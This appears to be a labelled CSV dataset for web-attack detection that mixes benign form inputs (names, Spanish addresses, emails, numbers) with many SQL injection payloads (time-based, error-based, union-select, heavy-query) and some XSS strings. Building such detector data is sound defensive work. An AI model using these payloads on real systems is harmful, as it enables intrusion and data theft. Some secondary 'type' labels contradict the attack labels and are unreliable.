Text,attack_type,Label,type
ming-yua,norm,0,normal
1%')));select pg_sleep(5)--,sqli,1,sql
marshaus,norm,0,normal
11901410z,norm,0,normal
asertivamente,norm,0,normal
1424,norm,0,normal
09899393d,norm,0,normal
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,normal
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""wcze""=""wcze",sqli,1,sql
"jose incenga 14,",norm,0,normal
86464472c,norm,0,normal
"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",sqli,1,sql
1') and 4380=5851 and ('cxcl'='cxcl,sqli,1,normal
93026638x,norm,0,normal
vilanova de arousa,norm,0,normal
2546840770409858,norm,0,normal
"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""%""=""",sqli,1,sql
maskell,norm,0,normal
c/ virgen del pilar 144,norm,0,normal
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('ngxz'='ngxz",sqli,1,sql
"1"") as nyui where 2511=2511;iif(5257=5257,1,1/0)",sqli,1,sql
cruz,norm,0,normal
0683879802529946,norm,0,normal
1%'));select pg_sleep(5)--,sqli,1,sql
812,norm,0,normal
romina,norm,0,normal
almansa ingls,norm,0,normal
85981189j,norm,0,normal
"1%"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
5537,norm,0,normal
monitor,norm,0,normal
sabourin,norm,0,normal
"function,[{}][0].constructor._('alert(1)')()</script>",xss,2,xss
1) and 2457=8146,sqli,1,normal
eduino,norm,0,normal
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
10960,norm,0,normal
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('lqql'='lqql",sqli,1,normal
celka,norm,0,normal
suau feixa,norm,0,normal
courtena,norm,0,normal
"-2460%"") or (2660=5767)*5767 and (""%""=""",sqli,1,normal
itrabo,norm,0,normal
50174,norm,0,normal
ja3aln,norm,0,normal
manquel,norm,0,normal
6120,norm,0,normal
giralda,norm,0,normal
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('vjhw' like 'vjhw",sqli,1,sql
42156,norm,0,normal
93tip72ar,norm,0,normal
16646,norm,0,normal
ann-mari,norm,0,normal
1'));select (case when (5418=6516) then 1 else 5418*(select 5418 from master..sysdatabases) end)--,sqli,1,sql
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
segu san marful,norm,0,normal
trampeador,norm,0,normal
straths@campanasextractoras.vn,norm,0,normal
1'||(select 'tzxr' from dual where 2934=2934 and 4595=4595#,sqli,1,sql
terencio,norm,0,normal
12527,norm,0,normal
"1%')));select benchmark(5000000,md5(0x4c4d6142)) and ((('%'='",sqli,1,sql
mathius,norm,0,normal
willetta,norm,0,normal
1') where 6842=6842;begin dbms_lock.sleep(5); end--,sqli,1,sql
"1%'))) and elt(4249=4249,7259) and ((('%'='",sqli,1,normal
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
1) as qgsb where 7600=7600 and 2006=2006,sqli,1,normal
"llosa de ranes, la",norm,0,normal
saturnino,norm,0,normal
41100,norm,0,normal
hua,norm,0,normal
1')));select sleep(5)#,sqli,1,sql
revuelta borgua,norm,0,normal
"-2748')) as gazw where 4624=4624 union all select 4624,4624#",sqli,1,sql
cerna sennacherribbo,norm,0,normal
imperial 143,norm,0,normal
""",,,,,x"" onerror=""alert(1)"">",xss,2,xss
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr",sqli,1,normal
17005940q,norm,0,normal
agustn,norm,0,normal
"-7812') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ttvo'='ttvo",sqli,1,sql
4108680786714852,norm,0,normal
"1 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
fisgar,norm,0,normal
"<img id=xss src=""livescript:[code]"">",xss,2,normal
domnech mila,norm,0,normal
8588111212393329,norm,0,normal
1433,norm,0,normal
millian@intelethernet.cc,norm,0,normal
1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
1) as uhmm where 2304=2304 union all select null#,sqli,1,sql
aurie,norm,0,normal
">""<style type=""text/javascript"">document.cookie=true;</style>",xss,2,sql
chalifou,norm,0,normal
jo,norm,0,normal
"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
sennett@ankawaelda.tr,norm,0,normal
1%'))) and (select * from (select(sleep(5)))fzno) and ((('%'=',sqli,1,sql
"calle santander, 0,",norm,0,normal
hightower@freetag.cl,norm,0,normal
peek@clubforex.ax,norm,0,normal
"1%"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""%""=""",sqli,1,sql
borguo bartomu,norm,0,normal
8115,norm,0,normal
raxter,norm,0,normal
">""<<script>document.cookie=true;</script>",xss,2,xss
'></select><script>alert(xss)</script>,xss,2,xss
1)) waitfor delay '0:0:5'--,sqli,1,sql
rio jarama 194 6-h,norm,0,normal
"barcelona 149, 5-e",norm,0,normal
"1' in boolean mode) and elt(1210=1210,sleep(5))#",sqli,1,normal
granfiel,norm,0,normal
"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",sqli,1,sql
zacaras,norm,0,normal
39696,norm,0,normal
1')) as zffq where 9572=9572 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
"1) as adzj where 5575=5575 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",sqli,1,sql
pacn,norm,0,normal
elche/elx,norm,0,normal
"<<script>alert(""crosssitescripting"");//<</script>",xss,2,xss
2s323a657a679,norm,0,normal
lacruz morey,norm,0,normal
prepost1ra9in,norm,0,normal
1)) and 4637=1408 and ((6509=6509,sqli,1,normal
-5449' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ryvy' like 'ryvy,sqli,1,sql
6382,norm,0,normal
6233284855351457,norm,0,normal
"espinar, el",norm,0,normal
9270,norm,0,normal
zoldou@stainless.tw,norm,0,normal
3041,norm,0,normal
"1%""));if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
macular,norm,0,normal
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""snht""=""snht",sqli,1,sql
23280,norm,0,normal
"-9197%""))) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",sqli,1,sql
"1'||(select 'jlon' where 1461=1461;iif(5257=5257,1,1/0)",sqli,1,sql
navalmoral de bjar,norm,0,normal
"1'+(select 'nzgq' where 7230=7230 and elt(1210=1210,sleep(5)))+'",sqli,1,sql
4608056297024601,norm,0,normal
valdeganga,norm,0,normal
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""oyou""=""oyou",sqli,1,sql
"1"") as hoiv where 9708=9708 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
inconstitucional,norm,0,normal
tapinga,norm,0,normal
1006455310670976,norm,0,normal
1'||(select 'exls' where 3837=3837 and sleep(5))||',sqli,1,sql
"1"")) as zbfj where 2285=2285;(select * from (select(sleep(5)))acdk)#",sqli,1,sql
c/ maria de padilla 5 12a,norm,0,normal
1') and (2763=4004)*4004 and ('dtts'='dtts,sqli,1,normal
5546391843457163,norm,0,normal
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",sqli,1,sql
"c/ estornino s/n, 9f",norm,0,normal
colvin@freemachine.no,norm,0,normal
vital,norm,0,normal
1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,sqli,1,sql
"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",sqli,1,sql
$ventador,norm,0,normal
von_semm,norm,0,normal
ochoa7,norm,0,normal
diminucin,norm,0,normal
4687701725293094,norm,0,normal
amarilis,norm,0,normal
"1)) as hqwy where 4433=4433 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
49440,norm,0,normal
"1""))) and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
"1'||(select 'fbsr' where 7899=7899 and elt(4249=4249,7259))||'",sqli,1,sql
boagne,norm,0,normal
alvaro-pagano@hiperpapel.an,norm,0,normal
pello melo,norm,0,normal
"1'||(select 'fdkl' where 4572=4572 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
hilburn@sanchezgordo.es,norm,0,normal
86943454g,norm,0,normal
"av. benisa 43, 10d",norm,0,normal
"make_set(8734=8734,sleep(5))",sqli,1,normal
"1%' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and '%'='",sqli,1,sql
defrance,norm,0,normal
f983ga2783,norm,0,normal
"-9977"" where 5132=5132 union all select 5132--",sqli,1,sql
abietceo,norm,0,normal
fuente ezcurra,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
latella,norm,0,normal
craig@youtubeanunciox.gf,norm,0,normal
"-2397)) as oizy where 1746=1746 union all select 1746,1746,1746,1746,1746,1746#",sqli,1,sql
5rt(0);'>rhainfosec,xss,2,sql
escobedo,norm,0,normal
kumushalieva@hiperbarcelona.ly,norm,0,normal
pandulfo,norm,0,normal
"plaza conde de carlet, 40",norm,0,normal
galt@automovilesalhambra.kr,norm,0,normal
08011,norm,0,normal
cuevas de san marcos,norm,0,normal
labandn tuto,norm,0,normal
camio canexa 161 11?g,norm,0,normal
1'))) rlike sleep(5) and ((('rozr' like 'rozr,sqli,1,normal
1')) as hxxm where 3792=3792 and sleep(5)#,sqli,1,normal
"1"") and 6969=(select 6969 from pg_sleep(5)) and (""btht""=""btht",sqli,1,sql
16c64si30,norm,0,normal
es2o135mie5to,norm,0,normal
"pl. cantarranillas 21,",norm,0,normal
zobelda,norm,0,normal
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""buwe""=""buwe",sqli,1,sql
"c/ doctor temes fernandez, 35",norm,0,normal
ruttmann@quadernideilgarda.dz,norm,0,normal
"<input type=""image"" dynid=xss src=""javascript:alert('xss');"">",xss,2,xss
"1') as wnyl where 8978=8978 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
catete,norm,0,normal
"1) as cnpv where 4902=4902 and elt(1210=1210,sleep(5))--",sqli,1,sql
arcos de jaln,norm,0,normal
farraron,norm,0,normal
-8828%'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',sqli,1,sql
"1%"")) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1') where 2284=2284 and make_set(8403=8403,8899)--",sqli,1,sql
ag77avacin,norm,0,normal
64115445r,norm,0,normal
"1) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"regimiento, 114,",norm,0,normal
45908,norm,0,normal
7746,norm,0,normal
9824,norm,0,normal
glyn7,norm,0,normal
1) as tykp where 6851=6851;waitfor delay '0:0:5'--,sqli,1,sql
"c/ violeta, s/n 9-b",norm,0,normal
villalba de los barros,norm,0,normal
1'||(select 'boxx' where 2038=2038 and 9198=9198--,sqli,1,sql
1992808528259508,norm,0,normal
3910,norm,0,normal
maureen,norm,0,normal
eslava,norm,0,normal
s!oap,norm,0,normal
gran@fernandosoto.ch,norm,0,normal
mclawhor,norm,0,normal
villazala,norm,0,normal
opsito,norm,0,normal
"polux, 198,",norm,0,normal
"1"")) as lfte where 3811=3811 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
57186589x,norm,0,normal
"1""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
4141615236089952,norm,0,normal
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
"-4571' union all select 3227,3227,3227,3227--",sqli,1,sql
litt,norm,0,normal
lloret de mar,norm,0,normal
4228,norm,0,normal
09128,norm,0,normal
1))) or sleep(5) and (((2209=2209,sqli,1,normal
ajuagas,norm,0,normal
"corua, a",norm,0,normal
tra5i0o0ed7a,norm,0,normal
7a2a6t1ro,norm,0,normal
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'xnap'='xnap,sqli,1,sql
"1"")) union all select null,null,null,null,null--",sqli,1,sql
c26ve7sar,norm,0,normal
-5211 union all select 1754--,sqli,1,sql
santa mara de la vega,norm,0,normal
aforismo,norm,0,normal
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""zlwb""=""zlwb",sqli,1,normal
34830,norm,0,normal
cruttenden@saludyfitness.ca,norm,0,normal
revacunacin,norm,0,normal
ittaly,norm,0,normal
downs,norm,0,normal
spurway,norm,0,normal
tillo,norm,0,normal
"plaa gabriela mistral, 140",norm,0,normal
1))) and 9575=1640--,sqli,1,sql
108,norm,0,normal
verdon.denissis@esencialser.cv,norm,0,normal
mallett-shibata@tisanuro.cc,norm,0,normal
fuentes calientes,norm,0,normal
zarzuela,norm,0,normal
debrocar,norm,0,normal
8787472125390389,norm,0,normal
0669143201019058,norm,0,normal
"1"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
kempler7,norm,0,normal
"c/ escultor julio gonzalez 88,",norm,0,normal
"marines, los",norm,0,normal
clodoveo,norm,0,normal
benzo,norm,0,normal
"1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
stella mara,norm,0,normal
sait,norm,0,normal
1');select pg_sleep(5),sqli,1,sql
"-3452%' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='",sqli,1,sql
148ad5ra,norm,0,normal
hinwood-laretei@addl.es,norm,0,normal
portillo,norm,0,normal
5055,norm,0,normal
ahern.plott@zonamodelos.fr,norm,0,normal
1' where 1844=1844;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
""";alert('xss)//",xss,2,sql
6764,norm,0,normal
hus24lero,norm,0,normal
"1%"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
soule terraza,norm,0,normal
1')));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
1734128437321844,norm,0,normal
torres de barbus,norm,0,normal
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""utzr"" like ""utzr",sqli,1,sql
melque de cercos,norm,0,normal
00947908d,norm,0,normal
bosch linares,norm,0,normal
47529,norm,0,normal
jandette tarrida,norm,0,normal
icahel,norm,0,normal
1)) as sfan where 7176=7176 and 7017=7358,sqli,1,normal
"1%"")));begin user_lock.sleep(5); end--",sqli,1,sql
alexande,norm,0,normal
"mesonero romanos, s/n, 2?b",norm,0,normal
9106,norm,0,normal
p1n0350a,norm,0,normal
"1%""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
voseo,norm,0,normal
"1"")) as ikuz where 7385=7385;select sleep(5)#",sqli,1,sql
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",sqli,1,sql
"1"")) as cduw where 4495=4495;select pg_sleep(5)--",sqli,1,sql
campo de san pedro,norm,0,normal
72903426g,norm,0,normal
"1' where 6135=6135;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1"")) as czzg where 5483=5483 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
salinillas de bureba,norm,0,normal
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,sql
4476727258540536,norm,0,normal
1 where 9361=9361 and 7478=9170--,sqli,1,sql
wookie,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null#",sqli,1,sql
47419,norm,0,normal
"calle aljarafe, 161 13?b",norm,0,normal
ex074ico,norm,0,normal
hoya-gonzalo,norm,0,normal
"1')) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
01806,norm,0,normal
-3497' order by 1#,sqli,1,normal
siddell,norm,0,normal
ocallaghan@asyra.li,norm,0,normal
"calle ducado de neopatria 63, 12-h",norm,0,normal
(case when 5640=5640 then 5640 else null end),sqli,1,normal
12796200n,norm,0,normal
4916,norm,0,normal
rozele,norm,0,normal
edelman1@hotelestopsecret.mt,norm,0,normal
guindo vive,norm,0,normal
"1"")) rlike (select (case when (5342=1036) then 1 else 0x28 end)) and ((""ntdz"" like ""ntdz",sqli,1,sql
"1'||(select 'zpwe' from dual where 7743=7743 union all select null,null#",sqli,1,sql
-8069')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('qbvz'='qbvz,sqli,1,sql
portal,norm,0,normal
"-6377'||(select 'ryin' where 2113=2113 union all select 2113,2113,2113#",sqli,1,sql
"1'||(select 'votg' where 5105=5105 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-6519')) as tdlt where 5040=5040 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,sql
rubena,norm,0,normal
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('qvqf'='qvqf",sqli,1,sql
55950989q,norm,0,normal
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",sqli,1,sql
buisn andres,norm,0,normal
loudiadi,norm,0,normal
d9str7par,norm,0,normal
i4sacular,norm,0,normal
padoan@directoriogratuito.et,norm,0,normal
"1%"")) rlike sleep(5)#",sqli,1,normal
"1,(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(9693=9693,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'lywy' like 'lywy",sqli,1,sql
cebuano,norm,0,normal
"1' where 4149=4149 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
22010612a,norm,0,normal
"1%')));select count(*) from generate_series(1,5000000) and ((('%'='",sqli,1,sql
"1"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""sjiz"" like ""sjiz",sqli,1,sql
"1"") where 3122=3122 and sleep(5)#",sqli,1,normal
ohtomo@aldufa.im,norm,0,normal
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""fuus"" like ""fuus",sqli,1,sql
88833808b,norm,0,normal
vinasco pomar,norm,0,normal
"-8038')) or elt(1032=1032,3623) and (('xfyq'='xfyq",sqli,1,normal
"calle pablo penaguilas, 112, 7?a",norm,0,normal
teo,norm,0,normal
74566884x,norm,0,normal
brau ganfornina,norm,0,normal
5048106105397665,norm,0,normal
22011041h,norm,0,normal
"1%""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- mtaq",sqli,1,sql
"1) where 1185=1185 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
mcilrath,norm,0,normal
"1')) as mxxd where 7255=7255 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"calle calcio, 58, 3-h",norm,0,normal
budd9,norm,0,normal
garfiada,norm,0,normal
4518,norm,0,normal
villanueva del campillo,norm,0,normal
"1%'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",sqli,1,sql
"1%"") rlike sleep(5) and (""%""=""",sqli,1,normal
barron,norm,0,normal
"1"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
vilasis mena,norm,0,normal
"1"") waitfor delay '0:0:5' and (""vjpg""=""vjpg",sqli,1,normal
04146926a,norm,0,normal
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('ulkq'='ulkq,sqli,1,sql
"1%' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and '%'='",sqli,1,sql
2un4141ali46r,norm,0,normal
"-3971%'))) or elt(1032=1032,3623) and ((('%'='",sqli,1,normal
5287631327187373,norm,0,normal
1')) rlike (select (case when (8489=8820) then 1 else 0x28 end)) and (('fbjf'='fbjf,sqli,1,sql
dac@eonon.com.cy,norm,0,normal
"-4068'))) union all select 9491,9491,9491--",sqli,1,sql
floriana,norm,0,normal
-9826 where 4103=4103 order by 1#,sqli,1,normal
"-5617) where 2132=2132 union all select 2132,2132,2132,2132#",sqli,1,sql
0432799934318688,norm,0,normal
a5aranjada,norm,0,normal
petrus rosselot,norm,0,normal
"1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
6569,norm,0,normal
ling-yu,norm,0,normal
brandsen,norm,0,normal
praza da constitucion 162,norm,0,normal
chui_alberti@faders.com.nc,norm,0,normal
-1011 or 7140=9977--,sqli,1,sql
"1"")) as ufba where 4049=4049;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
1';select case when 6555=7349 then 1 else null end--,sqli,1,sql
"-9003"")) union all select 9721,9721--",sqli,1,sql
morales del vino,norm,0,normal
olmeda de las fuentes,norm,0,normal
michigan,norm,0,normal
1%') union all select null--,sqli,1,sql
"1') union all select null,null,null,null,null--",sqli,1,sql
4085822319269290,norm,0,normal
crovetto roger,norm,0,normal
83042756z,norm,0,normal
perendengue,norm,0,normal
"1%"")) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
arbelez grippo,norm,0,normal
18513875w,norm,0,normal
gerino,norm,0,normal
osornillo,norm,0,normal
t5m3la,norm,0,normal
"c/ andorra, 71",norm,0,normal
80819303v,norm,0,normal
47609,norm,0,normal
santo domingo de las posadas,norm,0,normal
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"")) as fjtv where 8904=8904;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"-2745' or elt(1032=1032,3623)",sqli,1,normal
manferidor,norm,0,normal
polesello@tantomontamontatanto.int,norm,0,normal
cristy,norm,0,normal
"1) where 9059=9059 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
"1%"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
1;select sleep(5),sqli,1,sql
kalil,norm,0,normal
"1')) as jxvv where 6593=6593 or elt(6272=6272,sleep(5))--",sqli,1,sql
"-2333' union all select 9714,9714,9714--",sqli,1,sql
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
r92e1*56e,norm,0,normal
"1')) and make_set(8403=8403,8899) and (('sxgl'='sxgl",sqli,1,normal
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('xiyl' like 'xiyl",sqli,1,sql
"xiprer 61, 2-a",norm,0,normal
42172,norm,0,normal
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""cecf""=""cecf",sqli,1,normal
70243797a,norm,0,normal
clavel,norm,0,normal
guciz,norm,0,normal
(2329=4209)*1,sqli,1,normal
"1%"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",sqli,1,normal
"calle guadamacileros, 24 6-c",norm,0,normal
"1,(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",sqli,1,sql
avenida casanova de eiris 42 3?c,norm,0,normal
4016,norm,0,normal
"1%"") or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
"1')) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-2246"")) union all select 4613,4613,4613,4613,4613,4613#",sqli,1,sql
envaronar,norm,0,normal
04762189q,norm,0,normal
1') where 3893=3893;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
mayola laparra,norm,0,normal
"calle monte miramar, s/n",norm,0,normal
siripong,norm,0,normal
44561,norm,0,normal
whipp@esmeraldas.org.tm,norm,0,normal
"1"" where 9618=9618 and (3020=3020)*6703--",sqli,1,sql
